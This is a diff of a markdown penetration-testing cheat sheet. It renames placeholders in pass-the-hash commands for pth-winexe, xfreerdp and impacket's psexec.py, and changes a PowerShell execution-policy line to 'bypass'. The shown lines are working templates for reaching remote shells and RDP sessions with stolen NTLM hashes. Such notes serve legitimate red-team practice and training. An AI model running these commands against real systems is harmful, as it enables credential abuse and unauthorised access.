@@ -189,7 +189,7 @@ Invoke-Command -ComputerName UFC-JUMPSRV -Credential $cred -ScriptBlock {
 **[+] Pass the hash using pth-winexe (Available in Kali Linux)**
 
 ```
-pth-winexe -U USER%aad3b435b51404eeaad3b435b51404ee:NTLM //IP cmd
+pth-winexe -U USER%aad3b435b51404eeaad3b435b51404ee:USER_NTLM_HERE //IP cmd
 ```
 
 &nbsp;
@@ -197,7 +197,7 @@ pth-winexe -U USER%aad3b435b51404eeaad3b435b51404ee:NTLM //IP cmd
 **[+] Access RDP using pass the hash (xfreerdp tool)**
 
 ```
-xfreerdp /u:username /pth:NTLM /d:domain /v:IP
+xfreerdp /u:username /pth:USER_NTLM_HERE /d:domain /v:IP
 ```
 
 &nbsp;
@@ -205,7 +205,7 @@ xfreerdp /u:username /pth:NTLM /d:domain /v:IP
 **[+] Pass the hash using PsExec.py**
 
 ```
-python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:NTLM sqldevadmin@192.168.50.49
+python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:USER_NTLM_HERE anyuser@192.168.50.49
 ```
 
 &nbsp;
@@ -260,7 +260,7 @@ Invoke-ACLScanner -ResolveGUID | ? {$_.IdentityReferenceName -like "*jumpsrv*"}
 ```
 In Powershell you can write:
 
-Set-ExecutionPolicy -ExecutionPolicy Unrestricted
+Set-ExecutionPolicy -ExecutionPolicy bypass
 
 or run powershell like this:
 
